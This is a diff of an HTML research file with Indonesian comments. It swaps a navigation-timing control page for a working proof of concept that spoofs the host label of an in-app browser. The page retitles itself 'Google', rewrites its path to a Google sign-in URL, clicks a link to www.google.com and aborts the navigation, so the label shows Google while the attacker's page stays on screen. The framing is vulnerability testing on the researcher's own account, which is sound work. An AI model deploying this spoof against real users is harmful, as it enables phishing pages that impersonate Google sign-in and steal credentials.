@@ -1,31 +1,16 @@
-<!-- 12 | 2026 · KONTROL SILANG untuk 1-11 — supaya angka jendela tidak salah dibaca | [1-CLICK]
-     Tanpa file ini, "jendela 800 ms" bisa saja cuma laptopmu sedang sibuk.
-     Tiga lengan kontrol, dijalankan berurutan, semuanya ke tujuan yang SAMA:
-       K1  tujuan cepat, tanpa blokir            -> jendela HARUS ~0 ms   (dasar)
-       K2  tujuan ter-prerender                  -> jendela HARUS ~0 ms   (paint sudah selesai duluan)
-       K3  tujuan diblokir 3 detik               -> jendela HARUS ~3000 ms (mekanisme bekerja)
-     Baca hasilnya begini:
-       K1 dan K2 kecil, K3 besar        -> mekanismenya nyata, angka 3.html boleh dipercaya
-       K1 juga besar                    -> mesinmu lambat/sibuk, SEMUA angka tidak sah, ulangi
-       K3 kecil                         -> browser menahan bar sampai paint = kelas ini mati di sini
-     Aturan yang tidak boleh dilanggar: jangan pernah melaporkan angka dari 3.html tanpa
-     menjalankan file ini di sesi yang SAMA, di mesin yang SAMA, dalam beberapa menit yang sama. -->
-<script type="speculationrules">
-{"prerender":[{"urls":["2.html?block=0&via=K2"]}]}
-</script>
-<button onclick="run(0,'K1')">K1 · tanpa blokir</button>
-<button onclick="run(0,'K2')">K2 · ter-prerender</button>
-<button onclick="run(3000,'K3')">K3 · blokir 3 detik</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!doctype html><meta charset=utf-8>
+<!-- PREDIKAT: label host in-app menampilkan www.google.com sementara dokumen tetap milikku
+     ORACLE: kirim URL ini ke DM/postingan AKUN SENDIRI, buka di dalam app -> screenshot label + panel
+     CONTROL: hapus setTimeout(... ABORT ...) -> nav commit dan halamanku tertimpa
+     EXPECTED-SECURE: label kembali ke host nyata begitu navigasi dibatalkan -->
+<h2>attacker document (tetap terlihat)</h2>
+<select id=s><option>-- pilih --</option><option>Lanjutkan</option></select>
+<a id=a href="https://www.google.com/" target="_self" hidden>x</a>
+<pre id=p></pre>
 <script>
-var L = JSON.parse(sessionStorage.kontrol || '{}');
-function draw() {
-  var k = Object.keys(L);
-  g.textContent = 'REAL ORIGIN: ' + location.href + '\n\n' +
-    (k.length ? k.map(function (x) { return x + ' : ' + L[x] + ' ms'; }).join('\n') : 'belum ada hasil — jalankan K1, K2, K3 lalu kembali (Back) tiap kali.') +
-    '\n\nSAH bila: K1 dan K2 kecil, K3 ~3000. K1 besar = mesin sibuk, semua angka batal.';
-}
-draw();
-function run(ms, tag) { sessionStorage.t0 = Date.now(); sessionStorage.tag = tag; location.href = '2.html?block=' + ms + '&via=' + tag; }
-if (sessionStorage.gapBack) { L[sessionStorage.tag] = sessionStorage.gapBack; sessionStorage.kontrol = JSON.stringify(L); delete sessionStorage.gapBack; draw(); }
+const ABORT = 'sf36-noapp://x';
+document.title = 'Google';                                    // ember F — sengaja dipisah, JANGAN dihitung bukti
+history.replaceState(0, '', '/accounts/google.com/signin');    // pre-spoof path, tetap same-origin
+s.addEventListener('change', () => { a.click(); setTimeout(() => { location.href = ABORT; }, 120); });
+p.textContent = 'REAL: ' + location.href;
 </script>
